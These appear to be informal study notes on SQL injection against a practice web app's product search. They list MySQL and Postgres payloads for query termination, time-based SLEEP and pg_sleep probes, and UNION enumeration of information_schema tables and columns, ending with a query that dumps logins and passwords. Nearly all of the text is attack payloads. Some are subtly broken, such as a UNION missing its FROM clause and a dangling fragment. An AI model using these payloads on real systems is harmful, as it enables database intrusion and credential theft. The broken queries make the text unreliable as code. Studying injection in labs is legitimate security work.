query = "SELECT * FROM home_product WHERE name LIKE '%Nail';        


';--    : Using " '; " we are ending the sql query and "--" is used a comment in sql. So the rest of whatever sql query that is being formed is commented out.



Mysql Version :
hammer' AND 0 = SLEEP(2);--   : this will end the sql query after hammer and run a mysql command sleep, which will sleep for 2 seconds.


PostGres version:
'; SELECT pg_sleep(10);--




To get all the details of all the tables in the database:


Mysql Version:

Hammer' UNION (select table_name, table_schema, 3, 4 information_schema.tables);--

PostGres Version:

';select table_name,table_schema,3,4 from information_schema.tables;--


'; select 

Now that we have tables we dont know what columns are present in which tables, to actually view the columns.

So now to find what all columns are present in a desired table :


Mysql Version:

Hammer' UNION (select COLUMN_NAME, 2, 3 from information_schema.columns where TABLE_NAME = 'auth_user');--

Postgres:
';select COLUMN_NAME, 2, 3,4 from information_schema.columns where TABLE_NAME = 'auth_user';--



-------------




';select login, password,3,4 from home_detail;--
